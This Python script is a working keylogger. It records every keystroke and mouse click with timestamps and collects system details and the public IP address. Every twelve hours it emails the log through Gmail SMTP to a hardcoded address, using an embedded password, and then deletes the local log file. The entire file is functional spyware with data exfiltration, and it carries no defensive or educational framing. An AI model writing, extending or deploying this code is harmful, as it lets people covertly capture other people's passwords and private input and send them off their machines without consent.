from pynput import keyboard
from pynput import mouse
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import platform
import time
import random
import os
import smtplib
import datetime


glob_log_file = ''


def set_log_file_name(): # Set the name of the log file
    log_file = 'D:\Workspace\Python\Keylogger'
    charlen = 15
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    name = ''

    while charlen > 0:
        name += chars[random.randint(0, 35)]
        charlen -= 1
    log_file += '\\'+name+'.txt'
    return log_file


def init_log_file(): # Function to initialize the log file with system information
    log_file = set_log_file_name()
    lfile = open(log_file, 'a')
    ip = get('https://api.ipify.org').text
    lfile.write('OS Name : '+platform.system()+'\n')
    lfile.write('OS Version : '+platform.version()+'\n')
    lfile.write('OS Release : '+platform.release()+'\n')
    lfile.write('Machine Type : '+platform.machine()+'\n')
    lfile.write('Processor : '+platform.processor()+'\n')
    lfile.write('Network Name : '+platform.node()+'\n')
    lfile.write('IP Address : '+ip+'\n')
    lfile.close()
    return log_file


def send_email(log_file): # Function to send an email
    fromaddr = "logthekeysbuddy@gmail.com"
    toaddr = "logthekeysbuddy@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keystroke Logs"
    body = ""
    msg.attach(MIMEText(body, 'plain'))
    filename = 'log.txt'
    attachment = open(log_file, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "logthekeys_123")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def keypress(Key): # Callback for Keypress - Opens the logfile and records the keystrokes
    lfile = open(glob_log_file,'a') 
    lfile.write(str(datetime.datetime.now()) + ' ' + str(Key) + '\n')
    lfile.close()


def on_click(x, y, button, pressed): # Callback for Mouse Click - Opens the logfile and records the mouse clicks
    string = ''
    lfile = open(glob_log_file,'a')
    if pressed:
        string = string + 'Pressed at ' + str(x) + ',' + str(y)
        lfile.write(str(datetime.datetime.now()) + ' ' + string + '\n')
    else:
        string = string + 'Released at ' + str(x) + ',' + str(y)
        lfile.write(str(datetime.datetime.now()) + ' ' + string + '\n')
    lfile.close()


while True:
    log_file = init_log_file()
    glob_log_file = log_file
    klistener = keyboard.Listener(on_press=keypress) # Initialize Keyboard Listener
    mlistener = mouse.Listener(on_click=on_click) # Initialize the Mouse Listener
    klistener.start()
    mlistener.start() 
    time.sleep(43200) # Sleep for 12 hours while recording the keystrokes
    klistener.stop()
    mlistener.stop()
    send_email(log_file) # Send the log file as a mail after stopping the listeners
    os.remove(log_file) # Remove the file

